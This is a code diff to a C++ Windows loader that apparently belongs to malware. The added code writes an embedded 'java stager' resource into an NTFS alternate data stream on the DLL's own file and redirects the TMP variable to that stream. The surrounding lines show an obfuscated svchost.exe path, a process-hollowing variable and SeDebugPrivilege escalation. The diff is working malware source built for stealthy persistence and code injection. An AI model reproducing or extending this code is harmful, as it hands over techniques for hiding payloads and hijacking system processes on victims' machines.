@@ -476,6 +476,33 @@ int main(int argc, char* argv[])
 	std::string hollow_proc_str;
 	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);
 
+	
+	//Get the filename of the DLL
+	char module_name[MAX_PATH]; 
+	GetModuleFileName( dll_handle, module_name, MAX_PATH );
+
+	//Add the ADS reference
+	std::string classPath = module_name;
+	classPath.append(COLON);
+
+
+	//Create an env variable with the name of the dll
+	if (! SetEnvironmentVariable("TMP", classPath.c_str()) ) 
+    {
+#ifdef _DBG
+		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+#endif
+        return 0;
+    }
+
+	//Extract java stager
+	if( !ExtractStager( classPath )){
+#ifdef _DBG
+		fprintf( debug_file_handle,"Unable to extract stager.\n", GetLastError());
+#endif
+        return 0;	
+	}
+
 	//"\\System32\\svchost.exe"
 	std::string path(decode_split("\x5\xc\x5\xc\x5\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x3\x3\x3\x2\x5\xc\x5\xc\x7\x3\x7\x6\x6\x3\x6\x8\x6\xf\x7\x3\x7\x4\x2\xe\x6\x5\x7\x8\x6\x5",46));
 	//systemroot
@@ -498,6 +525,73 @@ int main(int argc, char* argv[])
 #endif
 
 	return 0;
+}
+
+//=========================================================================
+/**
+	Extract the stager and write to ADS
+*/
+bool ExtractStager( std::string passedPath){
+
+    HGLOBAL hResourceLoaded;  // handle to loaded resource
+    HRSRC   hRes;              // handle/ptr to res. info.
+    char    *lpResLock;        // pointer to resource data
+    DWORD   dwSizeRes;
+    std::string strOutputLocation;
+    std::string strAppLocation;
+		
+	DWORD dwRet = 0;
+
+	HANDLE hStream = CreateFile( passedPath.c_str(), GENERIC_WRITE,
+                             FILE_SHARE_WRITE, NULL,
+                             OPEN_ALWAYS, 0, NULL );
+
+    if( hStream != INVALID_HANDLE_VALUE ){
+
+		
+		//Get the resource
+		hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN2) ,"BIN");
+		if( hRes == nullptr ){
+		
+#ifdef _DBG
+			fprintf( debug_file_handle,"Unable to find java resource.\r\n");
+#endif
+			return false;
+		}
+
+		hResourceLoaded = LoadResource(dll_handle, hRes);
+		if( hResourceLoaded == nullptr ){
+		
+#ifdef _DBG
+			fprintf( debug_file_handle,"Unable to load resource.\r\n");
+#endif
+			return false;
+		}
+
+		lpResLock = (char *) LockResource(hResourceLoaded);
+		dwSizeRes = SizeofResource(dll_handle, hRes);
+
+		//Write file if not zero
+		if( !dwSizeRes ){
+#ifdef _DBG
+			fprintf( debug_file_handle,"Resource size is zero.\r\n");
+#endif
+			return false;
+		}
+		
+		
+		if( !WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL)){
+#ifdef _DBG
+			fprintf( debug_file_handle,"Unable to write java file.\r\n");
+#endif
+			return false;
+		}
+
+		CloseHandle(hStream);
+	}
+
+	return true;
+
 }
 
 //===============================================================================================//
